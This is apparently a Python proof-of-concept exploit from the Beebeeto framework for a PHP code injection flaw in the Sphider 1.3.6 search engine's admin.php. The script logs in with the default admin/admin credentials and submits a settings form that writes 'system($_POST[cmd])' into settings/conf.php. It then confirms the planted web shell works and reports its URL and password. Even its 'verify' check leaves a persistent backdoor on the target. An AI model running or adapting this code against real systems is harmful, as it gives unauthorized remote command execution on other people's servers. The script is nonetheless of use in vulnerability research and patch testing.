#!/usr/bin/env python
#coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2
import urllib
import httplib

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0031',
            'name': 'Sphider 1.3.6 /admin.php 代码执行漏洞 POC',
            'author': 'DBA',
            'create_date': '2014-09-26',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'sphider',
            'vul_version': ['1.3.6'],
            'type': 'Code Execution',
            'tag': ['sphider', 'admin.php', 'code injection'],
            'desc': 'sphider admin.php PHP code injection.Default insert PHP shell code into /web/directory/sphider/settings/conf.php,code is "system($_POST[cmd]);"',  # 漏洞描述
            'references': ['http://www.exploit-db.com/exploits/34189/',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        login_data = urllib.urlencode({"user":"admin","pass":"admin"})
        login_url = args['options']['target'] + '/admin/auth.php'
        request = urllib2.Request(login_url,login_data)
        request.add_header('Content-Type', "application/x-www-form-urlencoded");
        request.add_header('Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32");
        response = urllib2.urlopen(request)
        attack_url = args['options']['target'] + '/admin/admin.php'
        payload = "f=settings&Submit=1&_version_nr=1.3.5&_language=en&_template=standard&_admin_email=admin%40localhost&_print_results=1&_tmp_dir=tmp&_log_dir=log&_log_format=html&_min_words_per_page=10&_min_word_length=3&_word_upper_bound=100;system($_POST[cmd])&_index_numbers=1&_index_meta_keywords=1&_pdftotext_path=c%3A%5Ctemp%5Cpdftotext.exe&_catdoc_path=c%3A%5Ctemp%5Ccatdoc.exe&_xls2csv_path=c%3A%5Ctemp%5Cxls2csv&_catppt_path=c%3A%5Ctemp%5Ccatppt&_user_agent=Sphider&_min_delay=0&_strip_sessids=1&_results_per_page=10&_cat_columns=2&_bound_search_result=0&_length_of_link_desc=0&_links_to_next=9&_show_meta_description=1&_show_query_scores=1&_show_categories=1&_desc_length=250&_did_you_mean_enabled=1&_suggest_enabled=1&_suggest_history=1&_suggest_rows=10&_title_weight=20&_domain_weight=60&_path_weight=10&_meta_weight=5"
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url
            print '[*] Post Data: ' + payload
        request = urllib2.Request(attack_url, payload)
        request.add_header('Content-Type', "application/x-www-form-urlencoded");
        request.add_header('Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32");
        response = urllib2.urlopen(request)
        content = response.read()
        shell_url = args['options']['target'] + '/settings/conf.php'
        request = urllib2.Request(shell_url, "cmd=echo sphiderwebshell")
        response = urllib2.urlopen(request)
        res = response.read()
        if "sphiderwebshell" in res:
            args['success'] = True
            args['poc_ret']['shell_url'] = shell_url
            args['poc_ret']['password'] = 'cmd'
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
